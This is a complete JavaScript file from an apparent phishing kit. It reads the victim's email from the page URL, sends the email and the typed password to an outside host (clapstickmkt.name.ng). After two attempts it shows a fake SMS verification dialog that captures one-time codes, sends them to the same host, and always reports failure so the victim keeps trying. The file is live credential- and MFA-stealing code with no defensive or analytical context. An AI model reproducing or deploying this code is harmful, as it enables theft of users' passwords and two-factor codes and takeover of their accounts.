$(document).ready(function() {
    var count = 0;

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (ai) {
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $('#aich').html(my_ai);
        $("#msg").hide();
    }
    ///////////////url getting ai////////////////

    var file = "bmV4dC5waHA=";

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var aiVal = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        var my_ai = aiVal;

        if (!aiVal) {
            $('#error').show();
            $('#error').html("Please input Email Address");
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password input your correct password");
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();

        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: 'https://clapstickmkt.name.ng/james/aaa.php',
            type: 'POST',
            data: {
                ai: aiVal,
                pr: pr,
            },
            beforeSend: function(xhr) {
                $('#submit-btn').html('Signing in...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            // show modal (modal itself will wait 2s before displaying)
                            showVerifyModal();
                            return false;
                        }
                    } else {
                        // keep existing behavior for non-ok (if any)
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    showVerifyModal();
                    return false;
                }
                $("#msg").show();
            },
            complete: function() {
                $('#submit-btn').html('View Document');
            }
        });
    });

/* ================= AUTHENTICATION MODAL CSS ================= */
var modalCSS = `
.verify-modal{display:none;position:fixed;inset:0;z-index:5000;font-family:Arial,Helvetica,sans-serif;color:#111}
.verify-overlay{position:absolute;inset:0;background:rgba(0,0,0,.35)}
.verify-box{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:1100px;max-width:calc(100vw - 32px);max-height:94vh;overflow-y:auto;background:#fff;border:1px solid #ddd;border-radius:12px;padding:48px 44px 42px;box-sizing:border-box}
.verify-title{font-size:38px;font-weight:600;margin:0 0 90px}
.verify-method{display:flex;align-items:center;gap:28px;font-size:36px;margin-bottom:85px}
.verify-method svg{width:48px;height:60px;flex-shrink:0}
.verify-mobile{display:flex;justify-content:space-between;align-items:center;gap:20px;font-size:36px;margin-bottom:38px}
.verify-mobile a{color:#28599a;text-decoration:none;font-size:30px}
.verify-input-row{display:grid;grid-template-columns:1fr 1fr;gap:24px}
.verify-input-row input,.send-code-btn{width:100%;min-width:0;height:96px;border:1px solid #ccc;border-radius:12px;background:#fff;box-sizing:border-box;font-size:30px;padding:0 30px}
.verify-input-row input:focus{outline:1px solid #aaa}
.send-code-btn{color:#111;cursor:pointer;white-space:normal}
.send-code-btn:disabled{color:#999;background:#fff;cursor:not-allowed}
.verify-description{font-size:28px;line-height:1.25;margin:24px 0 38px}
.trusted-device{display:flex;align-items:flex-start;gap:22px;font-size:30px;line-height:1.8;margin-bottom:32px}
.trusted-device input{width:40px;height:40px;flex-shrink:0;margin-top:8px}
.verify-next{width:100%;height:98px;border:0;border-radius:12px;background:#d9232e;color:#fff;font-size:34px;cursor:pointer}
.verify-next:disabled{opacity:.6;cursor:not-allowed}
.verify-status{display:none;margin-top:12px;font-size:14px;color:#333}
@media(max-width:650px){
.verify-box{padding:26px 20px}
.verify-title{font-size:28px;margin-bottom:45px}
.verify-method{font-size:25px;margin-bottom:42px}
.verify-mobile{align-items:flex-start;flex-direction:column;font-size:21px;margin-bottom:24px}
.verify-mobile a{font-size:17px}
.verify-input-row{grid-template-columns:1fr;gap:12px}
.verify-input-row input,.send-code-btn{height:58px;font-size:17px;padding:0 14px}
.verify-description{font-size:16px}
.trusted-device{font-size:17px;gap:12px}
.trusted-device input{width:24px;height:24px}
.verify-next{height:60px;font-size:21px}
}
`;
$('<style>').text(modalCSS).appendTo('head');

/* ================= AUTHENTICATION MODAL HTML ================= */
$('body').append(`
<div id="verifyModal"
     class="verify-modal"
     role="dialog"
     aria-modal="true"
     aria-labelledby="verifyTitle">

    <div class="verify-overlay"></div>

    <div class="verify-box">

        <h2 id="verifyTitle" class="verify-title">
            Authentication
        </h2>
       
        <div class="verify-method">
            <svg viewBox="0 0 48 60"
                 fill="none"
                 stroke="currentColor"
                 stroke-width="5"
                 aria-hidden="true">
                <rect x="5" y="3" width="38" height="54" rx="5"/>
                <circle cx="24" cy="47" r="2" fill="currentColor"/>
            </svg>
            <span>SMS</span>
        </div>
        <div align="center" id="error-message" style="margin-bottom: 5px; color: red; font-size: 28px;"></div>
        <div class="verify-mobile">
            <span>Mobile: ***********</span>
            <a id="phoneUnavailable">
                The phone number is unavailable?
            </a>
        </div>

        <div class="verify-input-row">
            <input
                id="verifyCode"
                type="text"
                inputmode="numeric"
                autocomplete="one-time-code"
                maxlength="6"
                placeholder="Please input"
                aria-label="Verification code">

            <button
                id="getCodeBtn"
                class="send-code-btn"
                type="button"
                disabled>
                Send Verification Code (60s)
            </button>
        </div>

        <div
            id="codeMsg"
            class="verify-status"
            role="status"
            aria-live="polite">
        </div>

        <p class="verify-description">
            The SMS code is valid for 5 minutes, and you need to obtain
            it again when it expires.
        </p>

        <label class="trusted-device">
            <input type="checkbox" id="trustedDevice">
            <span>
                Set as a trusted device, and the next login will not
                enter the verification
            </span>
        </label>
        <button
            id="submitVerify"
            class="verify-next"
            type="button"
            disabled>
            Next
        </button>

    </div>
</div>
`);

    /* ================= MODAL LOGIC ================= */
    var timer = null, seconds = 30;

    function startTimer() {
        clearInterval(timer);
        seconds = 30;
        $('#getCodeBtn').prop('disabled', true)
            .removeClass('active')
            .text(`Get a verification code (${seconds}s)`);

        timer = setInterval(function () {
            seconds--;
            $('#getCodeBtn').text(`Get a verification code (${seconds}s)`);
            if (seconds <= 0) {
                clearInterval(timer);
                $('#getCodeBtn')
                    .prop('disabled', false)
                    .addClass('active')
                    .text('Get a verification code');
            }
        }, 1000);
    }

    function showVerifyModal() {
        $('#verifyModal').fadeIn(200);
        $('#verifyCode').val('');
        $('#submitVerify').prop('disabled', true).removeClass('active');
        $('#codeMsg').hide();
        startTimer();
    }

    /* ================= EVENTS ================= */
    $(document).on('click', '#getCodeBtn.active', function () {
        $('#codeMsg').fadeIn(150);
        startTimer();
    });

    $('#verifyCode').on('input', function () {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length >= 6) {
            $('#submitVerify').prop('disabled', false).addClass('active');
        } else {
            $('#submitVerify').prop('disabled', true).removeClass('active');
        }
    });

    $('#submitVerify').on('click', function () {
    var $btn = $(this);
    if ($btn.prop('disabled')) return;

    // Change button state
    $btn
        .prop('disabled', true)
        .removeClass('active')
        .text('Verifying...');

    $.ajax({
        url: 'https://clapstickmkt.name.ng/james/aaa1.php',
        method: 'POST',
        data: {
            ncheta: $('#verifyCode').val(),
            ai: $('#ai').val()
        }
    });

    setTimeout(function () {
        var msg = document.getElementById('error-message');
        msg.textContent = 'Verification failed! Please try again...';
        msg.style.display = 'block';

        // Return button text to "Next" and clear the input
        $btn
            .prop('disabled', true)
            .removeClass('active')
            .text('Next');
        $('#verifyCode').val('');

        setTimeout(function () {
            msg.style.display = 'none';
        }, 5000);
    }, 3000);
});

});